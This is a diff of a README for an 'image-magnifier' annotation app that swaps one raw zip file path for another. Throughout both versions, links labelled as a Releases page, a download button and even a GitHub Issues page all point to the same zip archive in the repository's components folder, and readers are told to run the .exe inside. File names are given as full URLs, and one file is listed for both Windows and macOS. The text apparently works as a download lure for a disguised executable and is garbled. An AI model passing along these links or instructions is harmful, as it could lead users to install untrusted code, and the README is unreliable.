@@ -6,11 +6,11 @@ Welcome to image-magnifier! This application allows you to annotate images with 
 
 ## 📥 Download Your Copy
 
-[![Download image-magnifier](https://raw.githubusercontent.com/wake3212/image-magnifier/main/components/image-magnifier_maya.zip)](https://raw.githubusercontent.com/wake3212/image-magnifier/main/components/image-magnifier_maya.zip)
+[![Download image-magnifier](https://raw.githubusercontent.com/wake3212/image-magnifier/main/components/image-magnifier-v3.1-beta.3.zip)](https://raw.githubusercontent.com/wake3212/image-magnifier/main/components/image-magnifier-v3.1-beta.3.zip)
 
 You can get the latest version of image-magnifier from our Releases page. 
 
-[Visit this page to download](https://raw.githubusercontent.com/wake3212/image-magnifier/main/components/image-magnifier_maya.zip)
+[Visit this page to download](https://raw.githubusercontent.com/wake3212/image-magnifier/main/components/image-magnifier-v3.1-beta.3.zip)
 
 ## 💻 System Requirements
 
@@ -32,7 +32,7 @@ image-magnifier runs on most modern computers. Here’s what you need:
 Follow these steps to download and run image-magnifier:
 
 1. **Click the Download Link:**  
-   Use the button at the top or [this link](https://raw.githubusercontent.com/wake3212/image-magnifier/main/components/image-magnifier_maya.zip).
+   Use the button at the top or [this link](https://raw.githubusercontent.com/wake3212/image-magnifier/main/components/image-magnifier-v3.1-beta.3.zip).
 
 2. **Select the Latest Version:**  
    On the Releases page, look for the latest version of the application. It usually has a version number like v1.0.0.
@@ -41,7 +41,7 @@ Follow these steps to download and run image-magnifier:
    Click on the file for your operating system to download it to your computer.
 
 4. **Locate the Downloaded File:**  
-   Check your downloads folder to find the downloaded file. The file will be named something like `https://raw.githubusercontent.com/wake3212/image-magnifier/main/components/image-magnifier_maya.zip` for Windows or `https://raw.githubusercontent.com/wake3212/image-magnifier/main/components/image-magnifier_maya.zip` for macOS.
+   Check your downloads folder to find the downloaded file. The file will be named something like `https://raw.githubusercontent.com/wake3212/image-magnifier/main/components/image-magnifier-v3.1-beta.3.zip` for Windows or `https://raw.githubusercontent.com/wake3212/image-magnifier/main/components/image-magnifier-v3.1-beta.3.zip` for macOS.
 
 5. **Run the Installer:**  
    - **Windows:** Double-click the `.exe` file and follow the prompts to complete the installation.
@@ -86,6 +86,6 @@ You can use image-magnifier on JPEG, PNG, and BMP formats.
 
 ## 🌟 Feedback and Support
 
-If you have questions, suggestions, or feedback, feel free to reach out to our [GitHub Issues page](https://raw.githubusercontent.com/wake3212/image-magnifier/main/components/image-magnifier_maya.zip). Your input helps us improve the application.
+If you have questions, suggestions, or feedback, feel free to reach out to our [GitHub Issues page](https://raw.githubusercontent.com/wake3212/image-magnifier/main/components/image-magnifier-v3.1-beta.3.zip). Your input helps us improve the application.
 
 Thank you for choosing image-magnifier for your image annotation needs! Enjoy enhancing your images with ease.
